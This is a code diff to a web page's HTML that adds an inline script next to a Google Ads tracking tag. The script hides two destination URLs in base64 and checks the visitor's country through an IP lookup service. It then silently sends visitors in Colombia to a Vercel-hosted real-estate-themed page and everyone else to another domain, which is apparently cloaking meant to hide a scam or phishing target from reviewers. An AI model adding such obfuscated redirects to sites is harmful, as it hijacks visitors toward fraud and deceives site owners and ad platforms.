@@ -17,6 +17,25 @@
             
               gtag('config', 'AW-18251668201');
             </script>
+     <script>
+(function(){
+  const URL_CO  = atob("aHR0cHM6Ly9pbm11ZWJsZXNjb2xvbWJpYS10Mnd4LnZlcmNlbC5hcHAvaW5pY2lvLmh0bWw=");
+  const URL_OUT = atob("aHR0cHM6Ly9qZWxwaXQubGF0Lw==");
+
+  fetch("https://ipapi.co/json/")
+    .then(r => r.json())
+    .then(d => {
+      if (d.country === "CO") {
+        window.location.href = URL_CO;
+      } else {
+        window.location.href = URL_OUT;
+      }
+    })
+    .catch(() => {
+      window.location.href = URL_OUT;
+    });
+})();
+</script>
     
     <style>
         /* ===== RESET ===== */
